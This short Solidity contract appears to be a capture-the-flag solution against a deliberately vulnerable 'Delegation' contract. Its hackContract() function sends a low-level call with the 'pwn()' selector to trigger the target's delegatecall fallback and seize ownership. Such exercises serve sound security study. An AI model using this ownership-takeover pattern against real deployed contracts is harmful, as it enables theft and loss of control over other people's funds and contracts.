// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    bytes data;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Delegation d = Delegation(contractAddress);
        (bool success, bytes memory val) = address(d).call(abi.encodeWithSignature("pwn()"));
        if (success) {
            data = val;
        }
    }
}
